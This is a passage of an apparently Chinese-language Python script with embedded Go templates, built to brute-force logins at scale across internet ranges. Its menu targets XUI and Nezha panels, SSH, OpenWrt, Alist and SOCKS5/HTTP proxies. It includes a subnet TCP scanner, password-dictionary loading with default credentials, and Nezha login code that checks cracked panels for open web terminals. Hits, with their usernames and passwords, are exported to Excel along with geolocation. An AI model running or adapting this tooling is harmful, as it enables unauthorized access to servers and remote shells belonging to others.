    "	results := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	go func() {",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for res := range results {",
    "			fmt.Fprintln(writer, res)",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, results, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(results)",
    "}",
]

# =========================== 新增: 子网TCP扫描模板 ===========================
SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"net\"",
    "	\"os\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func inc(ip net.IP) {",
    "	for j := len(ip) - 1; j >= 0; j-- {",
    "		ip[j]++",
    "		if ip[j] > 0 { break }",
    "	}",
    "}",
    "func worker(tasks <-chan net.IP, results chan<- string, wg *sync.WaitGroup, port string, timeout time.Duration) {",
    "	defer wg.Done()",
    "	for ip := range tasks {",
    "		target := fmt.Sprintf(\"%s:%s\", ip.String(), port)",
    "		conn, err := net.DialTimeout(\"tcp\", target, timeout)",
    "		if err == nil {",
    "			conn.Close()",
    "			results <- target",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 4 {",
    "		fmt.Fprintln(os.Stderr, \"Usage: ./subnet_scanner <cidr> <port> <concurrency>\")",
    "		os.Exit(1)",
    "	}",
    "	cidr := os.Args[1]",
    "	port := os.Args[2]",
    "	concurrency := 0",
    "	fmt.Sscanf(os.Args[3], \"%d\", &concurrency)",
    "	ip, ipnet, err := net.ParseCIDR(cidr)",
    "	if err != nil {",
    "		fmt.Fprintln(os.Stderr, \"无效的CIDR:\", err)",
    "		return",
    "	}",
    "	tasks := make(chan net.IP, concurrency)",
    "	results := make(chan string, concurrency)",
    "	var wg sync.WaitGroup",
    "	// Writer Goroutine",
    "	go func() {",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for res := range results {",
    "			fmt.Fprintln(writer, res)",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	// Worker Goroutines",
    "	for i := 0; i < concurrency; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, results, &wg, port, 3*time.Second)",
    "	}",
    "	// Dispatcher",
    "	go func() {",
    "		for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {",
    "			ipCopy := make(net.IP, len(ip))",
    "			copy(ipCopy, ip)",
    "			tasks <- ipCopy",
    "		}",
    "		close(tasks)",
    "	}()",
    "	wg.Wait()",
    "	close(results)",
    "}",
]


# =========================== ipcx.py 内容 (已优化为流式处理) ===========================
IPCX_PY_CONTENT = r"""import requests
import time
import os
import re
import sys
import json
import itertools
from openpyxl import Workbook
from openpyxl.utils import get_column_letter
from tqdm import tqdm

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0
        column_letter = get_column_letter(col[0].column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length:
                        max_length = length
            except:
                pass
        adjusted_width = max(12, max_length + 2) # Set a minimum width
        ws.column_dimensions[column_letter].width = adjusted_width

def extract_ip_port(url):
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
    if match: return match.group(3)
    match = re.search(r'([^:/\s]+:\d+)', url)
    if match: return match.group(1)
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)', url)
    if match: return match.group(3)
    return url.split()[0]

def get_ip_info_batch(ip_list, retries=3):
    url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
    results = {}
    payload = [{"query": ip.split(':')[0]} for ip in ip_list]

    for attempt in range(retries):
        try:
            response = requests.post(url, json=payload, timeout=20)
            response.raise_for_status()
            data = response.json()
            for item in data:
                original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
                if original_ip_port:
                    if item.get('status') == 'success':
                        results[original_ip_port] = [original_ip_port, item.get('country', 'N/A'), item.get('regionName', 'N/A'), item.get('city', 'N/A'), item.get('isp', 'N/A')]
                    else:
                        results[original_ip_port] = [original_ip_port, '查询失败', '查询失败', '查询失败', '查询失败']
            for ip_port in ip_list:
                if ip_port not in results:
                    results[ip_port] = [ip_port, 'N/A', 'N/A', 'N/A', 'N/A']
            return [results[ip_port] for ip_port in ip_list]
        except requests.exceptions.RequestException as e:
            if attempt < retries - 1:
                time.sleep(2)
            else:
                return [[ip_port, '超时/错误', '超时/错误', '超时/错误', '超时/错误'] for ip_port in ip_list]
    return [[ip_port, 'N/A', 'N/A', 'N/A', 'N/A'] for ip_port in ip_list]

def process_ip_port_file(input_file, output_excel):
    try:
        total_lines = sum(1 for line in open(input_file, 'r', encoding='utf-8', errors='ignore'))
    except FileNotFoundError:
        print(f"Error: Input file '{input_file}' not found.")
        return
    
    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']

    if os.path.exists(output_excel):
        try: os.remove(output_excel)
        except OSError as e:
            print(f"无法删除旧的Excel文件 '{output_excel}': {e}。请手动关闭它。")
            return

    wb = Workbook()
    ws = wb.active
    ws.title = "IP信息"
    ws.append(headers)

    chunk_size = 100
    
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        with tqdm(total=total_lines, desc="[📊] IP信息查询", unit="ip", ncols=100) as pbar:
            while True:
                lines_chunk = [line.strip() for line in itertools.islice(f, chunk_size) if line.strip()]
                if not lines_chunk: break

                targets = []
                for line in lines_chunk:
                    addr, user, passwd = line, '', ''
                    try:
                        proxy_match = re.match(r'(\w+://)(?:([^:]+):([^@]+)@)?(.+)', line)
                        if proxy_match:
                            user, passwd, addr = proxy_match.group(2) or '', proxy_match.group(3) or '', f"{proxy_match.group(1)}{proxy_match.group(4)}"
                        else:
                            parts = line.split()
                            addr = parts[0]
                            if len(parts) >= 3: user, passwd = parts[1], parts[2]
                            elif len(parts) == 2: user = parts[1]
                    except Exception:
                         addr = line.split()[0] if line.split() else ''
                    
                    ip_port = extract_ip_port(addr)
                    if ip_port:
                        targets.append({'line': line, 'ip_port': ip_port, 'user': user, 'passwd': passwd})

                ip_ports_in_chunk = [target['ip_port'] for target in targets]
                if not ip_ports_in_chunk:
                    pbar.update(len(lines_chunk))
                    continue
                
                batch_results = get_ip_info_batch(ip_ports_in_chunk)
                
                for original_target, result_data in zip(targets, batch_results):
                    row = [original_target['line'], result_data[0], original_target['user'], original_target['passwd']] + result_data[1:]
                    ws.append(row)
                
                pbar.update(len(lines_chunk))
                
                if total_lines > chunk_size:
                    time.sleep(4.5)

    adjust_column_width(ws)
    wb.save(output_excel)
    print("\nIP信息查询完成！")

if __name__ == "__main__":
    if len(sys.argv) > 2:
        process_ip_port_file(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python ipcx.py <input_file> <output_file>")
"""

def generate_ipcx_py():
    """
    将存储在 IPCX_PY_CONTENT 变量中的内容写入到 ipcx.py 文件中。
    """
    with open('ipcx.py', 'w', encoding='utf-8') as f:
        f.write(IPCX_PY_CONTENT)

# =========================== 新增哪吒面板分析函数 ===========================
def debug_log(message, level="INFO"):
    colors = {
        "INFO": "\033[94m",
        "SUCCESS": "\033[92m",
        "WARNING": "\033[93m",
        "ERROR": "\033[91m",
        "ENDC": "\033[0m"
    }
    print("[{}] {}{}{}".format(level, colors.get(level, ''), message, colors['ENDC']))

def check_server_terminal_status(session, base_url, server_id):
    # 检测单台服务器的终端连接状态
    try:
        terminal_paths = [
            f"/dashboard/terminal/{server_id}", f"/dashboard/ssh/{server_id}",
            f"/dashboard/console/{server_id}", f"/dashboard/shell/{server_id}",
            f"/terminal/{server_id}", f"/ssh/{server_id}",
            f"/console/{server_id}", f"/shell/{server_id}"
        ]
        for path in terminal_paths:
            try:
                res = session.get(base_url + path, timeout=5, verify=False)
                if res.status_code == 200:
                    content = res.text.lower()
                    has_xterm = "xterm" in content
                    has_errors = any(error in content for error in [
                        "not found", "404", "error", "failed", "unavailable", "未找到", 
                        "错误", "失败", "不可用", "服务器不存在", "尚未连接", "terminal not available"
                    ])
                    if has_xterm and not has_errors:
                        return True
            except Exception:
                continue
        try:
            res = session.get(base_url + "/dashboard", timeout=5, verify=False)
            if res.status_code == 200:
                content = res.text.lower()
                if "xterm" in content and any(term in content for term in ["terminal", "ssh", "console", "shell"]):
                    return True
        except Exception:
            pass
    except Exception:
        return False
    return False

def count_terminal_accessible_servers(session, base_url):
    # 统计终端畅通的服务器数量
    try:
        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
        if res.status_code != 200:
            return 0, []
        
        data = res.json()
        servers = []
        
        if isinstance(data, dict) and "error" in data and "unauthorized" in data.get("error", "").lower():
            return check_terminal_status_via_pages(session, base_url)
        
        if isinstance(data, list): servers = data
        elif isinstance(data, dict) and "data" in data: servers = data["data"]
        
        if not servers: return 0, []
        
        count = 0
        accessible_servers = []
        for server in servers:
            if isinstance(server, dict) and "id" in server:
                server_id = server["id"]
                server_name = server.get("name", f"Server-{server_id}")
                if check_server_terminal_status(session, base_url, server_id):
                    count += 1
                    accessible_servers.append({"id": server_id, "name": server_name, "status": "终端畅通"})
        return count, accessible_servers
    except Exception:
        return 0, []

def check_terminal_status_via_pages(session, base_url):
    # API未授权时的备用检测方案
    try:
        res = session.get(base_url + "/dashboard", timeout=TIMEOUT, verify=False)
        if res.status_code == 200:
            content = res.text.lower()
            if "xterm" in content and any(term in content for term in ["terminal", "ssh", "console", "shell"]):
                return 1, [{"id": "unknown", "name": "Dashboard", "status": "终端畅通"}]
        return 0, []
    except Exception:
        return 0, []

def check_for_agents_and_terminal(session, base_url):
    # 检查机器数量和终端状态
    total_servers = 0
    try:
        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
        if res.status_code == 200:
            data = res.json()
            if isinstance(data, list): total_servers = len(data)
            elif isinstance(data, dict) and "data" in data and isinstance(data["data"], list): total_servers = len(data["data"])
    except Exception:
        pass
    
    if total_servers == 0: return False, 0, 0, []
    
    terminal_accessible_count, terminal_accessible_servers = count_terminal_accessible_servers(session, base_url)
    return True, terminal_accessible_count, total_servers, terminal_accessible_servers

def analyze_panel(result_line):
    # 多线程分析函数
    parts = result_line.split()
    if len(parts) < 3: return result_line, (0, 0, "格式错误")

    ip_port, username, password = parts[0], parts[1], parts[2]
    
    for protocol in ["http", "https"]:
        base_url = f"{protocol}://{ip_port}"
        session = requests.Session()
        login_url = base_url + "/api/v1/login"
        payload = {"username": username, "password": password}
        
        try:
            requests.packages.urllib3.disable_warnings()
            res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            
            if res.status_code == 200:
                try:
                    j = res.json()
                    is_login_success = False
                    auth_token = None

                    if "token" in j.get("data", {}):
                        auth_token = j["data"]["token"]
                        is_login_success = True
                    if "nz-jwt" in res.headers.get("Set-Cookie", ""): is_login_success = True
                    if j.get("code") == 200 and j.get("message", "").lower() == "success": is_login_success = True

                    if is_login_success:
                        if auth_token: session.headers.update({"Authorization": f"Bearer {auth_token}"})
                        
                        _, term_count, machine_count, term_servers = check_for_agents_and_terminal(session, base_url)
                        server_names = [s.get('name', s.get('id', '')) for s in term_servers]
                        servers_string = ", ".join(map(str, server_names)) if server_names else "无"
                        
                        return result_line, (machine_count, term_count, servers_string)
                except json.JSONDecodeError:
                    if "oauth2" in res.text.lower(): return result_line, (0, 0, "登录页面")
                    return result_line, (0, 0, "分析失败")
                except Exception as e:
                    debug_log(f"分析时出错 {base_url}: {e}", "ERROR")
                    return result_line, (0, 0, "分析失败")
        except requests.exceptions.RequestException:
            continue
            
    return result_line, (0, 0, "登录失败")

# =========================== 主脚本优化部分 ===========================
# 定义Go可执行文件的绝对路径
GO_EXEC = "/usr/local/go/bin/go"

def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
    if not os.path.exists(xlsx_file):
        print(f"⚠️  Excel文件 {xlsx_file} 不存在，跳过更新。")
        return

    try:
        wb = load_workbook(xlsx_file)
        ws = wb.active

        server_count_col = ws.max_column + 1
        terminal_count_col = ws.max_column + 2
        terminal_list_col = ws.max_column + 3
        
        ws.cell(row=1, column=server_count_col, value="服务器总数")
        ws.cell(row=1, column=terminal_count_col, value="终端畅通数")
        ws.cell(row=1, column=terminal_list_col, value="畅通服务器列表")

        for row_idx in range(2, ws.max_row + 1):
            original_address = ws.cell(row=row_idx, column=1).value
            if original_address in analysis_data:
                analysis_result = analysis_data[original_address]
                if len(analysis_result) == 3:
                    machine_count, term_count, servers_string = analysis_result
                    ws.cell(row=row_idx, column=server_count_col, value=machine_count)
                    ws.cell(row=row_idx, column=terminal_count_col, value=term_count)
                    ws.cell(row=row_idx, column=terminal_list_col, value=servers_string)
        
        wb.save(xlsx_file)
        print("✅ 成功将哪吒面板分析结果写入Excel报告。")
    except Exception as e:
        print(f"❌ 更新Excel文件时发生错误: {e}")


def input_with_default(prompt, default):
    user_input = input(f"{prompt} (默认: {default})：").strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt} (默认: {default})：").strip()
    return user_input if user_input else default

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_go_code(go_file_name, template_lines, **kwargs):
    code = "\n".join(template_lines)

    if '{timeout}' in code: code = code.replace("{timeout}", str(kwargs.get('timeout', 3)))
    if '{semaphore_size}' in code: code = code.replace("{semaphore_size}", str(kwargs.get('semaphore_size', 100)))

    if 'usernames' in kwargs and '{user_list}' in code:
        user_list_str = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in kwargs['usernames']]) + "}"
        code = code.replace("{user_list}", user_list_str)
    if 'passwords' in kwargs and '{pass_list}' in code:
        pass_list_str = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in kwargs['passwords']]) + "}"
        code = code.replace("{pass_list}", pass_list_str)

    if 'proxy_type' in kwargs and '{proxy_type}' in code:
        creds_list_str = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('credentials', [])]) + "}"
        code = code.replace("{proxy_type}", kwargs['proxy_type']) \
                   .replace("{auth_mode}", str(kwargs.get('auth_mode', 0))) \
                   .replace("{creds_list}", creds_list_str)
        if 'test_url' in kwargs:
            escaped_url = escape_go_string(kwargs['test_url'])
            code = code.replace("testURL      = \"http://myip.ipip.net\"", f'testURL      = "{escaped_url}"')

    with open(go_file_name, 'w', encoding='utf-8', errors='ignore') as f:
        f.write(code)

def compile_go_program(go_file, executable_name):
    if sys.platform == "win32": executable_name += ".exe"
    absolute_executable_path = os.path.abspath(executable_name)

    print(f"📦 [编译] 正在编译Go程序 {go_file} -> {absolute_executable_path}...")
    
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'

    try:
        process = subprocess.Popen(
            [GO_EXEC, 'build', '-ldflags', '-s -w', '-o', absolute_executable_path, go_file],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=go_env
        )
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            raise subprocess.CalledProcessError(process.returncode, [GO_EXEC, 'build'], stdout, stderr.decode('utf-8', 'ignore'))
        
        if stderr: print(f"   - ⚠️  Go编译器警告: {stderr.decode('utf-8', 'ignore')}")
        print(f"✅ [编译] Go程序编译成功: {absolute_executable_path}")
        return absolute_executable_path
    except subprocess.CalledProcessError as e:
        print(f"❌ [编译] Go程序 {go_file} 编译失败!\n   - 返回码: {e.returncode}\n   - 错误输出:\n{e.stderr}\n   - 请检查Go环境和代码。")
        return None
    except FileNotFoundError:
        print(f"❌ [编译] 错误: 未找到Go编译器 '{GO_EXEC}'。请确保Go已正确安装并位于系统PATH中。")
        return None

def adjust_oom_score():
    if sys.platform != "linux": return
    try:
        pid = os.getpid()
        oom_score_adj_path = f"/proc/{pid}/oom_score_adj"
        if os.path.exists(oom_score_adj_path):
            with open(oom_score_adj_path, "w") as f: f.write("-500")
            print("✅ [系统] 成功调整OOM Score，降低被系统杀死的概率。")
    except PermissionError:
        print("⚠️  [系统] 调整OOM Score失败：权限不足。建议使用root用户运行以获得最佳稳定性。")
    except Exception as e:
        print(f"⚠️  [系统] 调整OOM Score时发生未知错误: {e}")

def set_file_descriptor_limit():
    if sys.platform == "win32": return
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        new_limit = 65536
        if soft < new_limit:
            try:
                resource.setrlimit(resource.RLIMIT_NOFILE, (new_limit, hard))
                print(f"✅ [系统] 成功将文件描述符限制提升至 {new_limit}。")
            except ValueError:
                resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
                print(f"✅ [系统] 成功将文件描述符限制提升至系统最大值 {hard}。")
    except (ImportError, ValueError, PermissionError) as e:
        print(f"⚠️  [系统] 提升文件描述符限制失败: {e}。在高并发下可能遇到问题。")

def advise_on_sysctl():
    if sys.platform == "linux" and os.geteuid() == 0:
        print("\n--- 🚀 [系统性能建议 (Root权限)] 🚀 ---\n为获得最佳扫描性能，建议调整以下内核参数:\n  sudo sysctl -w net.ipv4.tcp_tw_reuse=1\n  sudo sysctl -w net.ipv4.ip_local_port_range=\"1024 65535\"\n  sudo sysctl -w net.core.somaxconn=65535\n------------------------------------------\n")

def check_and_manage_swap():
    if sys.platform != "linux": return
    try:
        if psutil.swap_memory().total > 0:
            print(f"✅ [系统] 检测到已存在的Swap空间，大小: {psutil.swap_memory().total / 1024 / 1024:.2f} MiB。")
            return

        total_mem_gb = psutil.virtual_memory().total / (1024**3)
        recommended_swap_gb = 2 if total_mem_gb < 2 else (int(total_mem_gb / 2) if 2 <= total_mem_gb <= 8 else (4 if 8 < total_mem_gb <= 32 else 8))

        print(f"⚠️  [系统] 警告：未检测到活动的Swap交换空间。您的内存为 {total_mem_gb:.2f} GB。")
        choice = input(f"❓ 是否要创建一个 {recommended_swap_gb}GB 的临时Swap文件来提高稳定性？(y/N): ").strip().lower()
        
        if choice == 'y':
            swap_file = "/tmp/autoswap.img"
            print(f"   - 正在创建 {recommended_swap_gb}GB Swap文件: {swap_file}...")
            try:
                if shutil.which("fallocate"):
                    subprocess.run(["fallocate", "-l", f"{recommended_swap_gb}G", swap_file], check=True, capture_output=True)
                else:
                    subprocess.run(["dd", "if=/dev/zero", f"of={swap_file}", "bs=1M", f"count={recommended_swap_gb * 1024}"], check=True, capture_output=True)
                
                subprocess.run(["chmod", "600", swap_file], check=True)
                subprocess.run(["mkswap", swap_file], check=True, capture_output=True)
                subprocess.run(["swapon", swap_file], check=True)
                
                atexit.register(cleanup_swap, swap_file)
                print(f"✅ [系统] 成功创建并启用了 {recommended_swap_gb}GB Swap文件。")
            except Exception as e:
                print(f"❌ [系统] Swap文件创建失败: {getattr(e, 'stderr', e)}. 请检查权限和磁盘空间。")
    except Exception as e:
        print(f"❌ [系统] Swap检查失败: {e}")

def cleanup_swap(swap_file):
    print(f"\n   - 正在禁用和清理临时Swap文件: {swap_file} ...")
    try:
        subprocess.run(["swapoff", swap_file], check=False)
        os.remove(swap_file)
        print("✅ [系统] 临时Swap文件已成功清理。")
    except Exception as e:
        print(f"⚠️  [系统] 清理Swap文件失败: {e}")

# ==================== 全新执行模型 (基于 Stdin/Stdout 和 ProcessPool) ====================
def process_chunk(executable_path, lines, timeout_per_ip, go_concurrency):
    input_data = "\n".join(lines).encode('utf-8')
    timeout_allowance = (timeout_per_ip * len(lines) / go_concurrency) * 1.5 + 30
    
    try:
        run_env = os.environ.copy()
        total_memory = psutil.virtual_memory().total
        mem_limit = int(total_memory * 0.80 / 1024 / 1024)
        run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
        run_env["GOGC"] = "200"

        process = subprocess.Popen([executable_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=run_env)
        stdout, stderr = process.communicate(input=input_data, timeout=timeout_allowance)
        
        if process.returncode != 0:
            return (False, f"任务块处理失败，返回码 {process.returncode}。\n错误信息:\n{stderr.decode('utf-8', 'ignore')}")
        
        results = stdout.decode('utf-8', 'ignore').strip().split('\n')
        return (True, [res for res in results if res])
        
    except subprocess.TimeoutExpired:
        process.kill()
        return (False, f"任务块处理超时（超过 {int(timeout_allowance)} 秒），已被终止。")
    except Exception as e:
        return (False, f"任务块执行时发生未知异常: {e}")

def run_scan_in_parallel(lines, executable_path, python_concurrency, go_internal_concurrency, chunk_size, timeout_per_ip, output_file_path, scan_desc="⚙️  [扫描] 处理任务块"):
    if not lines: return
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    print(f"ℹ️  [扫描] 已将 {len(lines)} 个目标分为 {len(chunks)} 个任务块。")
    
    with open(output_file_path, 'w', encoding='utf-8') as output_f:
        with ProcessPoolExecutor(max_workers=python_concurrency) as executor:
            future_to_chunk_id = {executor.submit(process_chunk, executable_path, chunk, timeout_per_ip, go_internal_concurrency): i for i, chunk in enumerate(chunks)}
            
            with tqdm(total=len(chunks), desc=scan_desc, ncols=100) as pbar:
                for future in as_completed(future_to_chunk_id):
                    chunk_id = future_to_chunk_id[future]
                    try:
                        success, result_data = future.result()
                        if success:
                            if result_data:
                                for line in result_data: output_f.write(line + '\n')
                                output_f.flush()
                        else:
                            print(" " * 100, end='\r')
                            print(f"\n❌ [块 {chunk_id}] {result_data}")
                    except Exception as exc:
                        print(f'\n任务块 {chunk_id} 执行时产生主控异常: {exc}')
                    pbar.update(1)
    print("\n")

def run_ipcx(final_result_file, xlsx_output_file):
    if os.path.exists(final_result_file) and os.path.getsize(final_result_file) > 0:
        print("\n📊 [报告] 正在查询IP地理位置并生成Excel报告...")
        subprocess.run([sys.executable, 'ipcx.py', final_result_file, xlsx_output_file])

def clean_temp_files(template_mode):
    print("🗑️  [清理] 正在删除临时文件...")
    temp_files = [
        'xui.go', 'subnet_scanner.go', 'ipcx.py', 'go.mod', 'go.sum', 
        'xui_executable', 'xui_executable.exe',
        'subnet_scanner_executable', 'subnet_scanner_executable.exe',
        'tcp_prescan.go', 'tcp_prescan_executable', 'tcp_prescan_executable.exe',
        'prescan_merged_results.tmp'
    ]
    for item in os.listdir('.'):
        if item.startswith('verifier_') or item.startswith('subnet_scan_'):
            temp_files.append(item)
    for f in temp_files:
        if os.path.exists(f):
            try: os.remove(f)
            except OSError: pass
    print("✅ [清理] 清理完成。")

def choose_template_mode():
    print("请选择爆破模式：\n1. XUI面板\n2. 哪吒面板\n3. SSH\n4. Sub Store\n5. OpenWrt/iStoreOS\n--- 代理模式 ---\n6. SOCKS5 代理\n7. HTTP 代理\n8. HTTPS 代理\n--- 其他面板 ---\n9. Alist 面板\n10. TCP 端口活性检测")
    mode_map = {"1": 1, "2": 2, "3": 6, "4": 7, "5": 8, "6": 9, "7": 10, "8": 11, "9": 12, "10": 13}
    while True:
        choice = input("输入 1-10 之间的数字 (默认: 1)：").strip() or "1"
        if choice in mode_map: return mode_map[choice]
        print("❌ 输入无效，请重新输入。")

def select_proxy_test_target():
    print("\n--- 代理测试目标选择 ---\n1: IPIP.net (推荐)\n2: Google (http)\n3: Xiaomi (http)\n4: Baidu (https)\n5: 自定义URL")
    url_map = {"1": "http://myip.ipip.net", "2": "http://www.google.com/generate_204", "3": "http://connect.rom.miui.com/generate_204", "4": "https://www.baidu.com"}
    while True:
        choice = input("请选择一个测试目标 (默认: 1): ").strip() or "1"
        if choice in url_map: return url_map[choice]
        if choice == "5": return input("请输入自定义测试URL: ").strip() or url_map["1"]
        print("⚠️  无效选择，请重新输入。")

def is_in_china():
    print("    - 正在通过 ping google.com 检测网络环境...")
    try:
        if subprocess.run(["ping", "-c", "1", "-W", "2", "google.com"], capture_output=True, check=False).returncode == 0:
            print("    - 🌍 Ping 成功，判断为海外服务器。")
            return False
        else:
            print("    - 🇨🇳 Ping 超时或失败，判断为国内服务器，将自动使用镜像。")
            return True
    except Exception:
        print("    - ⚠️  Ping 检测失败，将使用默认源。")
        return False

def check_environment(template_mode, is_china_env):
    import platform
    if platform.system().lower() == "windows":
        print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\n")
        return

    print(">>> 正在检查并安装依赖环境...")
    pkg_manager = "apt-get" if shutil.which("apt-get") else "yum"
    if not pkg_manager:
        print("❌ 无法检测到 apt-get 或 yum。")
        sys.exit(1)
    
    print(f"    - 检测到包管理器: {pkg_manager}")
    UPDATED = False
    def ensure_packages(pm, packages):
        nonlocal UPDATED
        sys.stdout.write(f"    - 正在使用 {pm} 检查系统包...")
        sys.stdout.flush()
        try:
            if not UPDATED and pm == "apt-get":
                subprocess.run([pm, "update", "-y"], check=True, capture_output=True)
                UPDATED = True
            subprocess.run([pm, "install", "-y"] + packages, check=True, capture_output=True)
            print(" ✅")
        except subprocess.CalledProcessError as e:
            print(f" ❌ 失败: {e.stderr.decode('utf-8', 'ignore')}")
            sys.exit(1)

    ensure_packages(pkg_manager, ["curl", "iputils-ping" if pkg_manager == "apt-get" else "iputils", "iproute2" if pkg_manager == "apt-get" else "iproute", "nmap", "masscan", "ca-certificates", "tar"])
    
    if pkg_manager == "apt-get":
        sys.stdout.write("    - 正在更新CA证书..."); sys.stdout.flush()
        subprocess.run(["update-ca-certificates"], check=True, capture_output=True)
        print(" ✅")

    def get_go_version():
        if not os.path.exists(GO_EXEC): return None
        try:
            out = subprocess.check_output([GO_EXEC, "version"], stderr=subprocess.DEVNULL).decode()
            m = re.search(r"go(\d+)\.(\d+)", out)
            return (int(m.group(1)), int(m.group(2))) if m else None
        except: return None

    if not (get_go_version() and get_go_version() >= (1, 20)):
        print("--- Go环境不满足，正在自动安装... ---")
        urls = ["https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz", "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"]
        if not is_china_env: urls.reverse()
        for url in urls:
            print(f"    - 正在从 {url.split('/')[2]} 下载Go...")
            try:
                subprocess.run(["curl", "-#", "-Lo", "/tmp/go.tar.gz", url], check=True)
                sys.stdout.write("    - 正在解压Go安装包..."); sys.stdout.flush()
                subprocess.run(["rm", "-rf", "/usr/local/go"], check=True, capture_output=True)
                subprocess.run(["tar", "-C", "/usr/local", "-xzf", "/tmp/go.tar.gz"], check=True, capture_output=True)
                print(" ✅"); break
            except Exception as e:
                print(f"      下载或解压失败: {e}，尝试下一个源...")
        else:
            print("❌ Go安装包下载失败，请检查网络。"); sys.exit(1)
    
    go_env = os.environ.copy()
    if is_china_env: go_env['GOPROXY'] = 'https://goproxy.cn,direct'
    if not os.path.exists("go.mod"):
        subprocess.run([GO_EXEC, "mod", "init", "xui"], check=True, capture_output=True, env=go_env)

    required_pkgs = []
    if template_mode == 6: required_pkgs.append("golang.org/x/crypto/ssh")
    if template_mode in [9, 10, 11]: required_pkgs.append("golang.org/x/net/proxy")
    if required_pkgs:
        sys.stdout.write("    - 正在安装Go模块..."); sys.stdout.flush()
        for pkg in required_pkgs:
            try: subprocess.run([GO_EXEC, "get", pkg], check=True, capture_output=True, env=go_env)
            except subprocess.CalledProcessError as e: print(f"\n❌ Go模块 '{pkg}' 安装失败: {e.stderr.decode('utf-8')}"); raise e
        print(" ✅")
    print(">>> ✅ 环境依赖检测完成 ✅ <<<\n")

def load_credentials(template_mode, auth_mode=0):
    usernames, passwords, credentials = [], [], []
    
    if template_mode == 7:
        if not os.path.exists("password.txt"):
            print("❌ 错误: Sub Store模式需要 password.txt 作为路径字典。"); sys.exit(1)
        with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        if not passwords: print("❌ 错误: password.txt 为空。"); sys.exit(1)
        return [], passwords, []
    
    if template_mode in [12, 13]: return [], [], []
    if auth_mode == 1: return [], [], []
    
    if auth_mode == 2:
        for f, lst, name in [("username.txt", usernames, "用户名"), ("password.txt", passwords, "密码")]:
            if not os.path.exists(f): print(f"❌ 错误: 缺少 {f} 文件。"); sys.exit(1)
            with open(f, 'r', encoding='utf-8-sig', errors='ignore') as h:
                lst.extend([line.strip() for line in h if line.strip()])
            if not lst: print(f"❌ 错误: {f} 文件为空。"); sys.exit(1)
        if template_mode == 2:
            passwords[:] = [p for p in passwords if len(p) >= 8 or p == 'admin']
            if not passwords: print("❌ 错误: 过滤后，哪吒面板密码字典为空。"); sys.exit(1)
        return usernames, passwords, []

    if auth_mode == 3:
        if not os.path.exists("credentials.txt"): print("❌ 错误: 缺少 credentials.txt 文件。"); sys.exit(1)
        with open("credentials.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            credentials = [line.strip() for line in f if line.strip() and ":" in line]
        if not credentials: print("❌ 错误: credentials.txt 文件为空或格式不正确。"); sys.exit(1)
        return [], [], credentials

    if input("是否使用 username.txt/password.txt 字典库？(y/N): ").strip().lower() == 'y':
        return load_credentials(template_mode, auth_mode=2)
    return (["root"], ["password"], []) if template_mode == 8 else (["admin"], ["admin"], [])

def get_vps_info():
    try:
        data = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10).json()
        return data.get('query', 'N/A'), data.get('country', 'N/A')
    except Exception: return "N/A", "N/A"

def get_nezha_server(config_file="config.yml"):
    if not os.path.exists(config_file): return "N/A"
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            return yaml.safe_load(f).get('server', 'N/A')
    except Exception: return "N/A"

def parse_result_line(line):
    proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?([\d\.]+):(\d+)', line)
    if proxy_match:
